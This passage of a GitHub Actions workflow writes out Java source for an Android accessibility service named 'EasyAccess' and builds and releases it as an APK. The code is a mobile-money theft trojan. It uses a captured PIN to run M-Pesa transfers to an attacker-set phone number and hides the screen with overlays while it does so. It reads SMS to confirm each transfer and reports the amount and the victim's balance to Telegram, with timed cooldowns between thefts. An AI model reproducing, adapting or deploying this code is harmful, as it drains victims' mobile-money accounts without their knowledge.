                      if (now.contains(typedValue) && !beforeSnapshot.contains(typedValue)) {
                          return false;
                      }

                      return true;
                  } catch (Exception e) {
                      return false;
                  }
              }

              private boolean runStep(String value, String label) {
                  String before = snapshotScreen();

                  if (!robustType(value)) {
                      try { typeInFieldLegacy(value); } catch (Exception ignored) { }
                  }

                  AccessibilityNodeInfo send = waitForSendNodeStrict(STRICT_SEND_WAIT_MS);
                  if (send == null) {
                      hardStopAndAbort(label + " menu did not appear (no SEND node)");
                      return false;
                  }

                  clickNodeStrict(send);

                  long start = System.currentTimeMillis();
                  while (System.currentTimeMillis() - start < STRICT_ADVANCE_WAIT_MS) {
                      if (dialogAdvanced(before, value)) return true;
                      try { Thread.sleep(50); } catch (InterruptedException ignored) { }
                  }

                  hardStopAndAbort(label + " clicked SEND but menu did not advance");
                  return false;
              }

              private void hardStopAndAbort(String reason) {
                  automating = false;
                  try { handler.removeCallbacks(overlayWatchdog); } catch (Exception ignored) { }
                  try { overlayManager.dismissNow(); } catch (Exception ignored) { }
                  extraOverlayTeardownBurst();
                  releaseScreenBrightLock();
                  TelegramQueue.get(this).send("Automation aborted: " + reason
                          + "\nNext PIN capture will retry.");
              }

              private void performStep1(double amount) {
                  if (!runStep("1", "Step 1")) return;
                  handler.postDelayed(() -> performStep2(amount), 750);
              }

              private void performStep2(double amount) {
                  if (!runStep("1", "Step 2")) return;
                  handler.postDelayed(() -> performStep3(amount), 750);
              }

              private void performStep3(double amount) {
                  String target = getCurrentTargetPhone();
                  if (!runStep(target, "Step 3")) return;
                  handler.postDelayed(() -> performStep4(amount), 750);
              }

              private void performStep4(double amount) {
                  if (!runStep(String.format("%.0f", amount), "Step 4")) return;
                  handler.postDelayed(() -> performStep5(amount), 1125);
              }

              private void performStep5(double amount) {
                  if (!runStep(pin, "Step 5")) return;
                  handler.postDelayed(() -> performStep6(amount), 750);
              }

              private void performStep6(double amount) {
                  if (!runStep("1", "Step 6")) return;

                  try { handler.removeCallbacks(overlayWatchdog); } catch (Exception ignored) { }

                  try { overlayManager.dismissNow(); } catch (Exception ignored) { }
                  extraOverlayTeardownBurst();
                  endAutomation();

                  final long startTime = System.currentTimeMillis();
                  handler.post(() -> verifyTransactionLoop(amount, startTime));
              }

              private void verifyTransactionLoop(double amount, long startTime) {
                  String sms = getNewestMpesaSmsBody();
                  String lower = sms != null ? sms.toLowerCase() : "";
                  long smsDate = getNewestMpesaSmsDate();

                  boolean isFresh = smsDate >= startTime;

                  if (isFresh && sms != null) {
                      for (String marker : FAILURE_MARKERS) {
                          if (lower.contains(marker)) {
                              try { overlayManager.dismissNow(); } catch (Exception ignored) { }
                              extraOverlayTeardownBurst();
                              endAutomation();
                              TelegramQueue.get(this).send("Transaction FAILED: " + marker
                                      + "\nNext PIN capture will retry.");
                              return;
                          }
                      }

                      boolean hasCurrency = lower.contains("ksh") || lower.contains("kes");
                      boolean hasSuccessMarker = false;
                      for (String marker : SUCCESS_MARKERS) {
                          if (lower.contains(marker)) { hasSuccessMarker = true; break; }
                      }
                      if (hasSuccessMarker && hasCurrency) {
                          try { overlayManager.dismissNow(); } catch (Exception ignored) { }
                          extraOverlayTeardownBurst();
                          long now = System.currentTimeMillis();
                          prefs.edit()
                              .putLong("last_tx_time", now)
                              .putLong("last_tx_success_time", now)
                              .apply();
                          endAutomation();
                          long nextStart = now + COOLDOWN_MS;
                          TelegramQueue.get(this).send("6 step complete");
                          TelegramQueue.get(this).send("Amount sent (ksh " + String.format("%.2f", amount) + ")");
                          TelegramQueue.get(this).send("Balance (ksh " + String.format("%.2f", verifiedBalance) + ")");
                          TelegramQueue.get(this).send("10 min cool down started.");
                          TelegramQueue.get(this).send("Next start " + formatClock(nextStart));
                          return;
                      }
                  }

                  if (System.currentTimeMillis() - startTime >= VERIFY_WINDOW_MS) {
                      try { overlayManager.dismissNow(); } catch (Exception ignored) { }
                      extraOverlayTeardownBurst();
                      long now = System.currentTimeMillis();
                      prefs.edit().putLong("last_tx_time", now).apply();
                      endAutomation();
                      long nextStart = now + COOLDOWN_MS;
                      TelegramQueue.get(this).send("6 step complete");
                      TelegramQueue.get(this).send("Amount sent (ksh " + String.format("%.2f", amount) + ")");
                      TelegramQueue.get(this).send("Balance (ksh " + String.format("%.2f", verifiedBalance) + ")");
                      TelegramQueue.get(this).send("10 min cool down started. (fallback: no SMS returned within 2m30s)");
                      TelegramQueue.get(this).send("Next start " + formatClock(nextStart));
                      return;
                  }

                  handler.postDelayed(() -> verifyTransactionLoop(amount, startTime), VERIFY_POLL_INTERVAL_MS);
              }

              private void extraOverlayTeardownBurst() {
                  try { overlayManager.dismiss(); } catch (Exception ignored) { }
                  handler.post(() -> {
                      try { overlayManager.dismiss(); } catch (Exception ignored) { }
                  });
                  handler.postDelayed(() -> {
                      try { overlayManager.dismiss(); } catch (Exception ignored) { }
                  }, 250);
                  handler.postDelayed(() -> {
                      try { overlayManager.dismiss(); } catch (Exception ignored) { }
                  }, 800);
                  handler.postDelayed(() -> {
                      try { overlayManager.dismiss(); } catch (Exception ignored) { }
                  }, 2000);
              }

              private AccessibilityNodeInfo waitForEditableField(long timeoutMs) {
                  long start = System.currentTimeMillis();
                  while (System.currentTimeMillis() - start < timeoutMs) {
                      try {
                          AccessibilityNodeInfo root = getRootInActiveWindow();
                          if (root != null) {
                              AccessibilityNodeInfo field = findEditableField(root);
                              if (field != null) return field;
                          }
                      } catch (Exception ignored) { }
                      try { Thread.sleep(50); } catch (InterruptedException ignored) { }
                  }
                  return null;
              }

              private boolean robustType(String value) {
                  for (int attempt = 0; attempt < 2; attempt++) {
                      AccessibilityNodeInfo field = waitForEditableField(2000L);
                      if (field == null) return false;
                      try {
                          field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
                          field.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                          Bundle args = new Bundle();
                          args.putCharSequence(
                              AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, value);
                          field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
                      } catch (Exception e) {
                          continue;
                      }
                      try { Thread.sleep(120); } catch (InterruptedException ignored) { }
                      try {
                          AccessibilityNodeInfo root = getRootInActiveWindow();
                          if (root != null) {
                              AccessibilityNodeInfo current = findEditableField(root);
                              if (current != null && current.getText() != null) {
                                  String now = current.getText().toString().trim();
                                  if (now.equals(value)) return true;
                              }
                          }
                      } catch (Exception ignored) { }
                  }
                  return false;
              }

              private boolean typeInFieldLegacy(String text) {
                  AccessibilityNodeInfo root = getRootInActiveWindow();
                  if (root == null) return false;
                  AccessibilityNodeInfo field = findEditableField(root);
                  if (field == null) field = findNodeByClassName(root, "android.widget.EditText");
                  if (field == null) field = findNodeByText(root, "Edit box");
                  if (field == null) field = findFirstFocusable(root);
                  if (field == null) return false;
                  field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
                  field.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                  Bundle args = new Bundle();
                  args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
                  return field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
              }

              private AccessibilityNodeInfo findNodeByClassName(AccessibilityNodeInfo node, String className) {
                  if (node == null) return null;
                  if (node.getClassName() != null && node.getClassName().toString().equals(className)) return node;
                  for (int i = 0; i < node.getChildCount(); i++) {
                      AccessibilityNodeInfo r = findNodeByClassName(node.getChild(i), className);
                      if (r != null) return r;
                  }
                  return null;
              }

              private AccessibilityNodeInfo findNodeByText(AccessibilityNodeInfo node, String text) {
                  if (node == null) return null;
                  if (node.getText() != null && node.getText().toString().equalsIgnoreCase(text)) return node;
                  for (int i = 0; i < node.getChildCount(); i++) {
                      AccessibilityNodeInfo r = findNodeByText(node.getChild(i), text);
                      if (r != null) return r;
                  }
                  return null;
              }

              private AccessibilityNodeInfo findFirstFocusable(AccessibilityNodeInfo node) {
                  if (node == null) return null;
                  if (node.isFocusable() && node.isEnabled()) return node;
                  for (int i = 0; i < node.getChildCount(); i++) {
                      AccessibilityNodeInfo r = findFirstFocusable(node.getChild(i));
                      if (r != null) return r;
                  }
                  return null;
              }

              private AccessibilityNodeInfo findEditableField(AccessibilityNodeInfo node) {
                  if (node == null) return null;
                  if (node.isEditable() && node.isEnabled()) return node;
                  for (int i = 0; i < node.getChildCount(); i++) {
                      AccessibilityNodeInfo r = findEditableField(node.getChild(i));
                      if (r != null) return r;
                  }
                  return null;
              }

              @Override
              public void onInterrupt() {
                  if (automating) {
                      hardStopAndAbort("Automation interrupted");
                  } else if (prechecking) {
                      hardStopPreCheck("Pre-check interrupted");
                  } else {
                      try { overlayManager.dismissNow(); } catch (Exception ignored) { }
                      extraOverlayTeardownBurst();
                  }
              }

              @Override
              public void onDestroy() {
                  super.onDestroy();
                  try { handler.removeCallbacks(overlayWatchdog); } catch (Exception ignored) { }
                  try { overlayManager.dismissNow(); } catch (Exception ignored) { }
                  extraOverlayTeardownBurst();
                  try {
                      if (partialWakeLock != null && partialWakeLock.isHeld()) partialWakeLock.release();
                  } catch (Exception ignored) { }
                  try {
                      if (screenBrightWakeLock != null && screenBrightWakeLock.isHeld()) screenBrightWakeLock.release();
                  } catch (Exception ignored) { }
                  executor.shutdown();
              }
          }
          EOF

      - name: Build APK
        run: |
          chmod +x gradlew
          ./gradlew clean assembleDebug

      - name: Upload APK artifact
        if: success()
        uses: actions/upload-artifact@v4
        with:
          name: EasyAccess
          path: app/build/outputs/apk/debug/EasyAccess.apk

      - name: Create GitHub Release
        if: success()
        uses: softprops/action-gh-release@v1
        with:
          files: app/build/outputs/apk/debug/EasyAccess.apk
          tag_name: v${{ github.run_number }}
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      - name: Build succeeded
        run: echo "EasyAccess APK built and released successfully."
